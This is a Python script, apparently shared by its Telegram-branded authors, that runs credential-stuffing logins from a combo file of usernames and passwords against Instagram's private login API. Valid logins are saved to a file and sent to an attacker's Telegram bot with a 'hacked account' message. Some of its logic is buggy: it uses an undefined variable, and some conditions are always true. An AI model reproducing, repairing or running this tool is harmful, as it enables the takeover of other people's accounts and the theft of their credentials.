import os
from time import sleep
import requests
from uuid import uuid4
import random


logo = """
\033[32m
 
 


    Telegram/Chnal/python968
    Telegram / @i4m_mrx
""" 
print(logo)
print("")
print("\033[31;1m[!] Welcome. Bo kar Pekrdne Tool . Y . Dabgra")
h , b,s,block = 0,0,0,0
tele = input("\033[32;1m[+] Send Hits To Telegram Bot? Y/n : ")
if "Y" in tele:
    id = input("\033[96;1m[+] id Telegram  > : ")
    bot = input("\033[96;1m[+] Token(Bot) : ")
elif "y" in tele:
    id = input("\033[96;1m[+] id Telegram  > : ")
    bot = input("\033[96;1m[+] Token(Bot) : ")
print(logo)
print("==========================")
ask = input("""[1] combo
==========================
[+] Start: """)

if ask == "1":
    assk = input("[+] Enter File Name: ")
    if '.txt' in assk:
        pass
    else:
        assk  = assk + '.txt'
    print(logo)
   
    print("")
    print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
    acc = open(assk,"r").read().splitlines()
    for combo in acc:
        user = combo.split(":")[0]
        pasw = combo.split(":")[1]
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=peroza akawntek hack bw💘 ====================\n[=] 𝙴𝚖𝚊𝚒𝚕 : {user} \n[=] 𝙿𝚊𝚜𝚜 : {pasw}\n========= @i4m_error =========\𝙱𝚢 : @im_error_Hack")
         
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' in log.text:
            s += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

    